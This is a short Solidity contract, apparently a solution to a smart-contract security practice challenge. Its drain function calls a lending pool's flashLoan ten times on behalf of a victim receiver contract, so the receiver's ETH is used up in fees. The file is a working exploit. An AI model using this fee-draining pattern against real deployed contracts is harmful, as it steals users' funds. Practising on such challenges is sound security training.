// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

contract DrainReceiver {
    NaiveReceiverLenderPool private pool;
    FlashLoanReceiver private reciever;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(NaiveReceiverLenderPool _pool, FlashLoanReceiver _reciever) {
        pool = _pool;
        reciever = _reciever;
    }

    function drain() external {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(reciever, ETH, 0, "");
        }
    }

    receive() external payable {}
}
